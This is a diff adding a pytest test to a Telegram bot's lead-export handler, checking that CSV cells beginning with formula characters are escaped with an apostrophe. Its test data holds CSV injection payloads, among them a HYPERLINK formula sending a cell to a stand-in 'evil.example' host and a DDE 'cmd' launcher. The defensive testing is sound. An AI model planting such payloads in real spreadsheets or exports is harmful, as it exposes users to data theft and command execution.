@@ -305,3 +305,43 @@ async def test_handlers_survive_inaccessible_message():
 
     assert any("Центральный" in text for text in sent)
     assert "card text" in sent
+
+
+@pytest.mark.asyncio
+async def test_export_csv_neutralizes_formula_injection(monkeypatch: pytest.MonkeyPatch):
+    """Cells starting with '=', '@', etc. must not be interpreted as formulas by Excel; phones stay intact."""
+    import csv
+    import io
+
+    from src.bot.handlers import leads as leads_handlers
+
+    evil_lead = _make_dummy_lead(
+        name='=HYPERLINK("http://evil.example/?x="&A1,"click")',
+        address="@SUM(1+1)",
+        socials="-2+3+cmd|' /C calc'!A0",
+        phone="+7 (812) 555-01-01, +7 999 111-22-33",
+    )
+
+    async def fake_export(session, crm_status):
+        return [evil_lead]
+
+    monkeypatch.setattr(leads_handlers, "export_leads_by_status", fake_export)
+    monkeypatch.setattr(leads_handlers, "async_session_maker", _DummySessionCtx)
+
+    cb = MagicMock(spec=CallbackQuery)
+    cb.data = "export:new"
+    cb.answer = AsyncMock()
+    cb.message = MagicMock(spec=Message)
+    cb.message.answer_document = AsyncMock()
+
+    await leads_handlers.handle_export_csv(cb)
+
+    document = cb.message.answer_document.call_args.kwargs["document"]
+    rows = list(csv.reader(io.StringIO(document.data.decode("utf-8-sig")), delimiter=";"))
+    header, row = rows[0], rows[1]
+    values = dict(zip(header, row))
+
+    assert values["Название"] == "'" + evil_lead.name
+    assert values["Адрес"] == "'@SUM(1+1)"
+    assert values["Соцсети"].startswith("'-2+3+cmd")
+    assert values["Телефон"] == "+7 (812) 555-01-01, +7 999 111-22-33"
